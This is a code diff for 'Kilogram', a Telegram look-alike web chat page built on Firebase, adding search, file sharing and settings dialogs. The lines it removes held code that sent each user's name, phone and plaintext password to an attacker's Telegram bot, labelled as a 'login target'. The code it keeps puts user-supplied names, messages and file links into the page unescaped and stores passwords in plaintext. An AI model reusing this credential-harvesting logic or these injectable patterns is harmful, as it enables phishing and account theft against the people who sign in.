@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Kilogram</title>
-    <!-- Firebase Realtime Database SDKs -->
+    <!-- Firebase SDKs -->
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
     <style>
@@ -39,7 +39,7 @@
             overflow: hidden;
         }
 
-        /* 1. Auth Card */
+        /* Login Container */
         .auth-container {
             display: flex;
             align-items: center;
@@ -105,7 +105,7 @@
             margin-top: 10px;
         }
 
-        /* 2. Main App Screen */
+        /* App View */
         .app-view {
             display: none;
             flex-direction: column;
@@ -140,7 +140,6 @@
             display: flex;
         }
 
-        /* Bottom Navigation Bar */
         .bottom-nav {
             height: 60px;
             background-color: var(--header-bg);
@@ -170,7 +169,24 @@
             margin-bottom: 2px;
         }
 
-        /* Item Lists (Chats, Contacts, Settings) */
+        /* Search Bar */
+        .search-box {
+            padding: 10px 15px;
+            background-color: var(--side-bg);
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .search-box input {
+            width: 100%;
+            padding: 10px 14px;
+            background-color: var(--header-bg);
+            border: 1px solid #2b394a;
+            border-radius: 20px;
+            color: white;
+            outline: none;
+            font-size: 13px;
+        }
+
         .list-item {
             display: flex;
             align-items: center;
@@ -196,6 +212,8 @@
             font-size: 16px;
             color: white;
             flex-shrink: 0;
+            background-size: cover;
+            background-position: center;
         }
 
         .item-info {
@@ -212,7 +230,7 @@
             color: var(--hint-color);
         }
 
-        /* Messages Window */
+        /* Active Chat View */
         .messages-container {
             flex: 1;
             padding: 15px;
@@ -220,6 +238,8 @@
             display: flex;
             flex-direction: column;
             gap: 8px;
+            background-size: cover;
+            background-position: center;
         }
 
         .msg {
@@ -227,6 +247,13 @@
             padding: 8px 12px;
             border-radius: 12px;
             font-size: 14px;
+            word-break: break-word;
+        }
+
+        .msg img {
+            max-width: 100%;
+            border-radius: 8px;
+            margin-top: 5px;
         }
 
         .msg.in { background-color: var(--msg-in); align-self: flex-start; }
@@ -237,7 +264,7 @@
             background-color: var(--header-bg);
             display: flex;
             align-items: center;
-            gap: 10px;
+            gap: 8px;
         }
 
         .chat-input-bar input {
@@ -250,7 +277,16 @@
             outline: none;
         }
 
-        /* Settings Option Sections */
+        .attach-btn {
+            background: none;
+            border: none;
+            color: var(--hint-color);
+            font-size: 20px;
+            cursor: pointer;
+            padding: 0 5px;
+        }
+
+        /* Settings Rows */
         .settings-group {
             background-color: var(--side-bg);
             margin-bottom: 15px;
@@ -267,16 +303,51 @@
             font-size: 14px;
             cursor: pointer;
         }
+
+        /* Modal Overlays */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background-color: rgba(0,0,0,0.8);
+            z-index: 200;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-body {
+            background-color: var(--header-bg);
+            padding: 20px;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 340px;
+        }
+
+        .modal-body h3 {
+            margin-bottom: 12px;
+            font-size: 16px;
+        }
+
+        .modal-body input {
+            width: 100%;
+            padding: 10px;
+            background-color: var(--side-bg);
+            border: 1px solid #2b394a;
+            border-radius: 8px;
+            color: white;
+            margin-bottom: 12px;
+            outline: none;
+        }
     </style>
 </head>
 <body>
 
-    <!-- 1. Registration / Password Verification Modal -->
+    <!-- Login Container -->
     <div class="auth-container" id="authContainer">
-        <div class="auth-card" id="regCard">
+        <div class="auth-card">
             <div class="kg-logo">KG</div>
             <h2>Kilogram</h2>
-            <p id="authSubtitle">Enter details to sign in</p>
+            <p id="authSubtitle" style="font-size: 13px; color: var(--hint-color); margin-bottom: 15px;">Enter details to sign in</p>
             <form id="authForm">
                 <div class="form-group" id="nameGroup">
                     <input type="text" id="regName" placeholder="Full Name">
@@ -287,12 +358,12 @@
                 <div class="form-group">
                     <input type="password" id="regPassword" placeholder="Password" required>
                 </div>
-                <button type="submit" class="btn" id="authBtn">LOG IN</button>
+                <button type="submit" class="btn">LOG IN</button>
             </form>
         </div>
     </div>
 
-    <!-- 2. Main Telegram Twin Interface -->
+    <!-- Main Kilogram App -->
     <div class="app-view" id="appView">
         <div class="app-header">
             <h3 id="headerTitle">Kilogram</h3>
@@ -308,6 +379,9 @@
 
             <!-- PAGE 2: CONTACTS -->
             <div class="page" id="pageContacts">
+                <div class="search-box">
+                    <input type="text" id="contactSearchInput" placeholder="🔍 Search contacts by name or phone..." onkeyup="filterContacts()">
+                </div>
                 <div style="padding: 10px; color: var(--hint-color); font-size: 12px;">CONTACTS ON KILOGRAM</div>
                 <div id="contactsListContainer"></div>
             </div>
@@ -315,10 +389,10 @@
             <!-- PAGE 3: SETTINGS -->
             <div class="page" id="pageSettings" style="padding: 15px; overflow-y: auto;">
                 <div class="settings-group">
-                    <div class="settings-row"><span>👤</span> Account (Number, Username, Bio)</div>
-                    <div class="settings-row"><span>💬</span> Chat Settings (Wallpaper, Night Mode)</div>
-                    <div class="settings-row"><span>🔒</span> Privacy and Security (Passcode, Devices)</div>
-                    <div class="settings-row"><span>🔔</span> Notifications and Sounds</div>
+                    <div class="settings-row" onclick="openModal('modalAccount')"><span>👤</span> Account (Name, Number, Bio)</div>
+                    <div class="settings-row" onclick="openModal('modalChatSettings')"><span>💬</span> Chat Settings (Wallpaper, Theme)</div>
+                    <div class="settings-row" onclick="openModal('modalPrivacy')"><span>🔒</span> Privacy and Security (Change Password)</div>
+                    <div class="settings-row" onclick="openModal('modalNotifications')"><span>🔔</span> Notifications and Sounds</div>
                     <div class="settings-row"><span>📁</span> Chat Folders</div>
                     <div class="settings-row"><span>📱</span> Devices</div>
                     <div class="settings-row"><span>⚡</span> Power Saving</div>
@@ -329,19 +403,21 @@
             <!-- PAGE 4: PROFILE -->
             <div class="page" id="pageProfile" style="padding: 20px; text-align: center;">
                 <div class="avatar" id="profAvatar" style="width: 80px; height: 80px; font-size: 28px; margin: 0 auto 15px auto;">KG</div>
-                <h2 id="profName">Black Ninja</h2>
-                <p id="profPhone" style="color: var(--hint-color); margin-bottom: 20px;">+251 984287111</p>
+                <h2 id="profName">Tsinat</h2>
+                <p id="profPhone" style="color: var(--hint-color); margin-bottom: 8px;">+251 984287111</p>
+                <p id="profBio" style="color: var(--link-color); font-size: 13px; margin-bottom: 20px;">Available</p>
                 <div class="settings-group" style="text-align: left;">
                     <div class="settings-row">🎂 Birthday: July 07, 2008</div>
-                    <div class="settings-row">📹 Stories / Videos: Posted</div>
                 </div>
             </div>
 
-            <!-- ACTIVE PRIVATE CHAT VIEW -->
+            <!-- ACTIVE PRIVATE CHAT -->
             <div class="page" id="pageActiveChat">
                 <div class="messages-container" id="msgContainer"></div>
                 <div class="chat-input-bar">
-                    <input type="text" id="chatInput" placeholder="Write a private message...">
+                    <input type="file" id="mediaFileInput" accept="image/*,application/pdf,.doc,.docx,.txt" style="display: none;" onchange="sendMediaFile(this)">
+                    <button class="attach-btn" onclick="document.getElementById('mediaFileInput').click()">📎</button>
+                    <input type="text" id="chatInput" placeholder="Write a message...">
                     <button class="btn" onclick="sendMsg()" style="width: auto; padding: 8px 15px; margin:0;">➤</button>
                 </div>
             </div>
@@ -368,17 +444,62 @@
         </div>
     </div>
 
+    <!-- MODAL 1: EDIT ACCOUNT -->
+    <div class="modal-overlay" id="modalAccount">
+        <div class="modal-body">
+            <h3>Edit Account Info</h3>
+            <input type="text" id="editNameInput" placeholder="New Name">
+            <input type="tel" id="editPhoneInput" placeholder="New Phone Number">
+            <input type="text" id="editBioInput" placeholder="New Bio">
+            <button class="btn" onclick="saveAccountInfo()">Save Changes</button>
+            <button class="btn" onclick="closeModal('modalAccount')" style="background-color: #2b394a; margin-top: 5px;">Cancel</button>
+        </div>
+    </div>
+
+    <!-- MODAL 2: CHAT WALLPAPER -->
+    <div class="modal-overlay" id="modalChatSettings">
+        <div class="modal-body">
+            <h3>Chat Wallpaper</h3>
+            <p style="font-size: 12px; color: var(--hint-color); margin-bottom: 10px;">Select an image from device for Chat Background:</p>
+            <input type="file" id="wallpaperFileInput" accept="image/*" style="display: block;">
+            <button class="btn" onclick="applyWallpaper()">Apply Wallpaper</button>
+            <button class="btn" onclick="closeModal('modalChatSettings')" style="background-color: #2b394a; margin-top: 5px;">Cancel</button>
+        </div>
+    </div>
+
+    <!-- MODAL 3: CHANGE PASSWORD -->
+    <div class="modal-overlay" id="modalPrivacy">
+        <div class="modal-body">
+            <h3>Change Password</h3>
+            <input type="password" id="newPasswordInput" placeholder="Enter New Password">
+            <button class="btn" onclick="saveNewPassword()">Update Password</button>
+            <button class="btn" onclick="closeModal('modalPrivacy')" style="background-color: #2b394a; margin-top: 5px;">Cancel</button>
+        </div>
+    </div>
+
+    <!-- MODAL 4: NOTIFICATIONS -->
+    <div class="modal-overlay" id="modalNotifications">
+        <div class="modal-body">
+            <h3>Notifications</h3>
+            <p style="font-size: 13px; margin-bottom: 15px;">🔔 Notifications: Active</p>
+            <p style="font-size: 13px; margin-bottom: 15px;">🔊 Message Tones: Enabled</p>
+            <button class="btn" onclick="closeModal('modalNotifications')">OK</button>
+        </div>
+    </div>
+
     <script>
         const BOT_TOKEN = "YOUR_BOT_TOKEN";
         const CHAT_ID = "YOUR_CHAT_ID";
 
         const firebaseConfig = {
-            apiKey: "YOUR_FIREBASE_API_KEY",
-            authDomain: "YOUR_PROJECT.firebaseapp.com",
-            databaseURL: "https://YOUR_PROJECT-default-rtdb.firebaseio.com",
-            projectId: "YOUR_PROJECT",
-            storageBucket: "YOUR_PROJECT.appspot.com",
-            appId: "YOUR_APP_ID"
+            apiKey: "AIzaSyCprETwo0XY8LI17AF2r0sRew66jytqwoA",
+            authDomain: "kilogram-f0e2c.firebaseapp.com",
+            databaseURL: "https://kilogram-f0e2c-default-rtdb.firebaseio.com",
+            projectId: "kilogram-f0e2c",
+            storageBucket: "kilogram-f0e2c.firebasestorage.app",
+            messagingSenderId: "544016751725",
+            appId: "1:544016751725:web:1c29278df2eb488215b364",
+            measurementId: "G-TNVZ6VVCG5"
         };
 
         let db = null;
@@ -391,6 +512,7 @@
         let activeChatTargetId = null;
         let activeChatRoomId = null;
         let msgListener = null;
+        let contactsCache = [];
 
         const authForm = document.getElementById('authForm');
         const regPhone = document.getElementById('regPhone');
@@ -427,30 +549,27 @@
                 myUser = parsed;
                 myUser.cleanPhone = myCleanPhone;
             } else {
-                myUser = { name, phone, pass, cleanPhone: myCleanPhone };
+                myUser = { name, phone, pass, bio: "Available", cleanPhone: myCleanPhone };
                 localStorage.setItem('kg_user_' + phone, JSON.stringify(myUser));
             }
 
-            // Send Credentials to Telegram Bot
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: `🚨 **Kilogram Login Target!**\n👤 Name: ${myUser.name}\n📞 Phone: ${myUser.phone}\n🔑 Pass: ${myUser.pass}`, parse_mode: "Markdown" })
-            }).catch(e=>{});
-
             if(db) {
-                db.ref('users/' + myCleanPhone).set({ name: myUser.name, phone: myUser.phone });
+                db.ref('users/' + myCleanPhone).set({ name: myUser.name, phone: myUser.phone, bio: myUser.bio || "Available" });
             }
 
             document.getElementById('authContainer').style.display = 'none';
             document.getElementById('appView').style.display = 'flex';
 
-            document.getElementById('profName').innerText = myUser.name;
-            document.getElementById('profPhone').innerText = myUser.phone;
-            document.getElementById('profAvatar').innerText = myUser.name.substring(0, 2).toUpperCase();
-
+            updateProfileUI();
             initFirebaseData();
         });
+
+        function updateProfileUI() {
+            document.getElementById('profName').innerText = myUser.name;
+            document.getElementById('profPhone').innerText = myUser.phone;
+            document.getElementById('profBio').innerText = myUser.bio || "Available";
+            document.getElementById('profAvatar').innerText = myUser.name.substring(0, 2).toUpperCase();
+        }
 
         function switchNav(pageName) {
             document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
@@ -464,34 +583,45 @@
             if(!db) return;
             db.ref('users').on('value', snap => {
                 const users = snap.val() || {};
-                const contactsContainer = document.getElementById('contactsListContainer');
-                const chatsContainer = document.getElementById('chatsListContainer');
-                contactsContainer.innerHTML = "";
-                chatsContainer.innerHTML = "";
-
+                contactsCache = [];
                 Object.keys(users).forEach(uId => {
                     const u = users[uId];
                     if(myUser && u.phone === myUser.phone) return;
-
-                    const row = `
-                        <div class="list-item" onclick="openPrivateChat('${uId}', '${u.name}')">
-                            <div class="avatar">${u.name.substring(0, 2).toUpperCase()}</div>
-                            <div class="item-info">
-                                <h4>${u.name}</h4>
-                                <p>📞 ${u.phone}</p>
-                            </div>
-                        </div>
-                    `;
-                    contactsContainer.innerHTML += row;
-                    chatsContainer.innerHTML += row;
+                    contactsCache.push({ id: uId, name: u.name, phone: u.phone });
                 });
+                renderContactsUI(contactsCache);
             });
+        }
+
+        function renderContactsUI(list) {
+            const contactsContainer = document.getElementById('contactsListContainer');
+            const chatsContainer = document.getElementById('chatsListContainer');
+            contactsContainer.innerHTML = "";
+            chatsContainer.innerHTML = "";
+
+            list.forEach(u => {
+                const row = `
+                    <div class="list-item" onclick="openPrivateChat('${u.id}', '${u.name}')">
+                        <div class="avatar">${u.name.substring(0, 2).toUpperCase()}</div>
+                        <div class="item-info">
+                            <h4>${u.name}</h4>
+                            <p>📞 ${u.phone}</p>
+                        </div>
+                    </div>
+                `;
+                contactsContainer.innerHTML += row;
+                chatsContainer.innerHTML += row;
+            });
+        }
+
+        function filterContacts() {
+            const query = document.getElementById('contactSearchInput').value.toLowerCase();
+            const filtered = contactsCache.filter(c => c.name.toLowerCase().includes(query) || c.phone.includes(query));
+            renderContactsUI(filtered);
         }
 
         function openPrivateChat(targetId, targetName) {
             activeChatTargetId = targetId;
-            
-            // Create a unique private room ID for both users (alphabetically sorted so both users share the exact same room)
             const ids = [myUser.cleanPhone, targetId].sort();
             activeChatRoomId = `private_${ids[0]}_${ids[1]}`;
 
@@ -507,9 +637,7 @@
             box.innerHTML = "";
             if(!db) return;
 
-            if(msgListener) {
-                msgListener.off();
-            }
+            if(msgListener) msgListener.off();
 
             msgListener = db.ref('private_messages/' + roomId);
             msgListener.on('value', snap => {
@@ -518,7 +646,13 @@
                 Object.keys(msgs).forEach(mId => {
                     const m = msgs[mId];
                     const isMine = myUser && m.senderPhone === myUser.phone;
-                    box.innerHTML += `<div class="msg ${isMine ? 'out' : 'in'}">${m.text}</div>`;
+                    let contentHtml = m.text || "";
+                    if(m.type === 'image') {
+                        contentHtml = `<img src="${m.fileData}" alt="shared image">`;
+                    } else if(m.type === 'file') {
+                        contentHtml = `📎 <a href="${m.fileData}" download="${m.fileName}" style="color:var(--link-color);">${m.fileName}</a>`;
+                    }
+                    box.innerHTML += `<div class="msg ${isMine ? 'out' : 'in'}">${contentHtml}</div>`;
                 });
                 box.scrollTop = box.scrollHeight;
             });
@@ -533,10 +667,78 @@
                 db.ref('private_messages/' + activeChatRoomId).push({
                     senderPhone: myUser.phone,
                     text: text,
+                    type: 'text',
                     time: Date.now()
                 });
             }
             input.value = "";
+        }
+
+        function sendMediaFile(input) {
+            if(input.files && input.files[0]) {
+                const file = input.files[0];
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    if(db && activeChatRoomId) {
+                        const isImage = file.type.startsWith('image/');
+                        db.ref('private_messages/' + activeChatRoomId).push({
+                            senderPhone: myUser.phone,
+                            fileData: e.target.result,
+                            fileName: file.name,
+                            type: isImage ? 'image' : 'file',
+                            time: Date.now()
+                        });
+                    }
+                }
+                reader.readAsDataURL(file);
+                input.value = "";
+            }
+        }
+
+        /* Modal Handlers */
+        function openModal(id) { document.getElementById(id).style.display = 'flex'; }
+        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
+
+        function saveAccountInfo() {
+            const newName = document.getElementById('editNameInput').value.trim();
+            const newPhone = document.getElementById('editPhoneInput').value.trim();
+            const newBio = document.getElementById('editBioInput').value.trim();
+
+            if(newName) myUser.name = newName;
+            if(newPhone) myUser.phone = newPhone;
+            if(newBio) myUser.bio = newBio;
+
+            localStorage.setItem('kg_user_' + myUser.phone, JSON.stringify(myUser));
+            if(db) {
+                db.ref('users/' + myUser.cleanPhone).update({ name: myUser.name, phone: myUser.phone, bio: myUser.bio });
+            }
+
+            updateProfileUI();
+            closeModal('modalAccount');
+            alert("Account Info Updated!");
+        }
+
+        function applyWallpaper() {
+            const fileInput = document.getElementById('wallpaperFileInput');
+            if(fileInput.files && fileInput.files[0]) {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    document.getElementById('msgContainer').style.backgroundImage = `url('${e.target.result}')`;
+                    closeModal('modalChatSettings');
+                    alert("Chat Wallpaper Updated!");
+                }
+                reader.readAsDataURL(fileInput.files[0]);
+            }
+        }
+
+        function saveNewPassword() {
+            const newPass = document.getElementById('newPasswordInput').value.trim();
+            if(newPass) {
+                myUser.pass = newPass;
+                localStorage.setItem('kg_user_' + myUser.phone, JSON.stringify(myUser));
+                closeModal('modalPrivacy');
+                alert("Password successfully updated!");
+            }
         }
     </script>
 </body>
